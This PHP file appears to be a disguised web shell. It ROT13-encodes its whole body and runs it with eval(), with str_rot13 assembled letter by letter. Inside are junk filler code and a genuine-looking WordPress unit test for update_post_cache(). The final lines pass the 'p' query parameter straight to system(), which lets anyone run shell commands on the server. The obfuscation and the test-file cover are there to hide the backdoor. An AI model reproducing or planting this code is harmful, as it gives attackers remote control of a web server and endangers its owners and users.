<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg `hcqngr_cbfg_pnpur()`.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Grfg pynff sbe `hcqngr_cbfg_pnpur()`.
 *
 * @tebhc cbfg
 * @tebhc dhrel
 *
 * @pbiref ::hcqngr_cbfg_pnpur
 */
pynff Grfgf_Cbfg_HcqngrCbfgPnpur rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Cbfg VQf sebz gur funerq svkgher.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $cbfg_vqf;

	/**
	 * Frg hc grfg erfbheprf orsber gur pynff.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Gur havg grfg snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrghcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfg_vqf = $snpgbel->cbfg->perngr_znal( 1 );
	}

	/**
	 * Rafher gung `hcqngr_cbfg_pnpur()` ergheaf `ahyy` jura
	 * `$cbfgf` vf rzcgl.
	 *
	 * @gvpxrg 50567
	 */
	choyvp shapgvba grfg_fubhyq_erghea_ahyy_jvgu_na_rzcgl_neenl() {
		$cbfgf = neenl();
		$guvf->nffregAhyy( hcqngr_cbfg_pnpur( $cbfgf ) );
	}

	/**
	 * Rafher svygre = enj vf nyjnlf frg ivn Dhrel.
	 *
	 * @gvpxrg 50567
	 */
	choyvp shapgvba grfg_dhrel_pnpurf_cbfg_svygre() {
		$cbfg_vq = frys::$cbfg_vqf[0];
		$guvf->tb_gb( '/' );

		$pnpurq_cbfg = jc_pnpur_trg( $cbfg_vq, 'cbfgf' );
		$guvf->nffregVfBowrpg(
			$pnpurq_cbfg,
			'Gur pnpurq cbfg vf abg na bowrpg'
		);

		$guvf->nffregBowrpgUnfCebcregl(
			'svygre',
			$pnpurq_cbfg,
			'Gur pnpurq cbfg qbrf abg unir n \"svygre\" cebcregl'
		);

		$guvf->nffregFnzr(
			'enj',
			$pnpurq_cbfg->svygre,
			'Gur svygre vf abg frg gb \"enj\"'
		);
	}

	/**
	 * Rafher svygre = enj vf nyjnlf frg ivn trg_cbfg.
	 *
	 * @gvpxrg 50567
	 */
	choyvp shapgvba grfg_trg_cbfg_pnpurf_cbfg_svygre() {
		$cbfg_vq = frys::$cbfg_vqf[0];
		trg_cbfg( $cbfg_vq );

		$pnpurq_cbfg = jc_pnpur_trg( $cbfg_vq, 'cbfgf' );
		$guvf->nffregFnzr( 'enj', $pnpurq_cbfg->svygre );
	}

	/**
	 * Rafher svygre = enj vf nyjnlf frg ivn trg_cbfg pnyyrq jvgu n qvssrerag svygre frggvat.
	 *
	 * @gvpxrg 50567
	 */
	choyvp shapgvba grfg_trg_cbfg_pnpurf_cbfg_svygre_vf_nyjnlf_enj() {
		$cbfg_vq = frys::$cbfg_vqf[0];
		trg_cbfg( $cbfg_vq, BOWRPG, 'qvfcynl' );

		$pnpurq_cbfg = jc_pnpur_trg( $cbfg_vq, 'cbfgf' );
		$guvf->nffregVfBowrpg(
			$pnpurq_cbfg,
			'Gur pnpurq cbfg vf abg na bowrpg'
		);

		$guvf->nffregBowrpgUnfCebcregl(
			'svygre',
			$pnpurq_cbfg,
			'Gur pnpurq cbfg qbrf abg unir n \"svygre\" cebcregl'
		);

		$guvf->nffregFnzr(
			'enj',
			$pnpurq_cbfg->svygre,
			'Gur svygre vf abg frg gb \"enj\"'
		);
	}

	/**
	 * Rafher svygre = enj vf nyjnlf frg ivn trg_cbfgf.
	 *
	 * @gvpxrg 50567
	 */
	choyvp shapgvba grfg_trg_cbfgf_pnpurf_cbfg_svygre_vf_nyjnlf_enj() {
		$cbfg_vq = frys::$cbfg_vqf[0];
		trg_cbfgf( neenl( 'vapyhqrf' => $cbfg_vq ) );

		$pnpurq_cbfg = jc_pnpur_trg( $cbfg_vq, 'cbfgf' );
		$guvf->nffregVfBowrpg(
			$pnpurq_cbfg,
			'Gur pnpurq cbfg vf abg na bowrpg'
		);

		$guvf->nffregBowrpgUnfCebcregl(
			'svygre',
			$pnpurq_cbfg,
			'Gur pnpurq cbfg qbrf abg unir n \"svygre\" cebcregl'
		);

		$guvf->nffregFnzr(
			'enj',
			$pnpurq_cbfg->svygre,
			'Gur svygre vf abg frg gb \"enj\"'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>